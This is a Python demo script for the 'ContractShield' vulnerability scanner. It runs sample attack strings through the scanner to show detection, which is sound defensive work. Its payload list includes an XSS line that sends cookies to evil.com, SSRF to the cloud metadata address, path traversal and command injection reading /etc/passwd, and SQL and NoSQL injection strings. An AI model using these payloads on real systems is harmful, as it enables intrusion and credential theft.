"""
Standalone vulnerability scanner example.

This example shows how to use the vulnerability scanner directly without middleware.
"""

from contractshield.vulnerability import (
    VulnerabilityScanner,
    VulnerabilityType,
    SQLiChecker,
    XSSChecker,
    SSRFChecker,
)
from contractshield.core import Severity


def main():
    # Create a scanner with default settings
    scanner = VulnerabilityScanner(
        enable_sqli=True,
        enable_xss=True,
        enable_path_traversal=True,
        enable_ssrf=True,
        enable_prototype_pollution=True,
        enable_nosql_injection=True,  # Opt-in
        enable_command_injection=True,  # Opt-in
    )

    # Example payloads to scan
    test_payloads = [
        # SQL Injection
        {
            "name": "SQL Injection test",
            "data": {"search": "1' UNION SELECT * FROM users --"},
        },
        # XSS
        {
            "name": "XSS test",
            "data": {"comment": "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"},
        },
        # SSRF
        {
            "name": "SSRF test",
            "data": {"webhook_url": "http://169.254.169.254/latest/meta-data/"},
        },
        # Path Traversal
        {
            "name": "Path Traversal test",
            "data": {"file": "../../../etc/passwd"},
        },
        # Prototype Pollution
        {
            "name": "Prototype Pollution test",
            "data": {"__proto__": {"admin": True}},
        },
        # NoSQL Injection
        {
            "name": "NoSQL Injection test",
            "data": {"password": {"$ne": ""}},
        },
        # Command Injection
        {
            "name": "Command Injection test",
            "data": {"filename": "file.txt; cat /etc/passwd"},
        },
        # Safe payload
        {
            "name": "Safe payload",
            "data": {"name": "John Doe", "email": "john@example.com"},
        },
    ]

    print("=" * 60)
    print("ContractShield Vulnerability Scanner Demo")
    print("=" * 60)
    print()

    for payload in test_payloads:
        print(f"Testing: {payload['name']}")
        print(f"Payload: {payload['data']}")

        findings = scanner.scan(payload["data"])

        if findings:
            print(f"  VULNERABILITIES FOUND: {len(findings)}")
            for finding in findings:
                severity_icon = {
                    Severity.CRITICAL: "ðŸ”´",
                    Severity.HIGH: "ðŸŸ ",
                    Severity.MEDIUM: "ðŸŸ¡",
                    Severity.LOW: "ðŸŸ¢",
                }.get(finding.severity, "âšª")

                print(f"    {severity_icon} [{finding.severity.value.upper()}] {finding.type.value}")
                print(f"       Path: {finding.path}")
                print(f"       Message: {finding.message}")
        else:
            print("  âœ“ No vulnerabilities found")

        print()

    print("=" * 60)
    print("Scanning complete!")
    print("=" * 60)


def individual_checkers_demo():
    """Demonstrate using individual checkers."""
    print("\n\nIndividual Checkers Demo")
    print("=" * 40)

    # SQL Injection checker
    sqli_checker = SQLiChecker()
    sqli_findings = sqli_checker.check("' OR '1'='1", "$.username")
    print(f"\nSQLi Checker: {len(sqli_findings)} findings")

    # XSS checker
    xss_checker = XSSChecker()
    xss_findings = xss_checker.check("<img onerror='alert(1)'>", "$.bio")
    print(f"XSS Checker: {len(xss_findings)} findings")

    # SSRF checker
    ssrf_checker = SSRFChecker()
    ssrf_findings = ssrf_checker.check("http://localhost:8080/admin", "$.callback")
    print(f"SSRF Checker: {len(ssrf_findings)} findings")


if __name__ == "__main__":
    main()
    individual_checkers_demo()
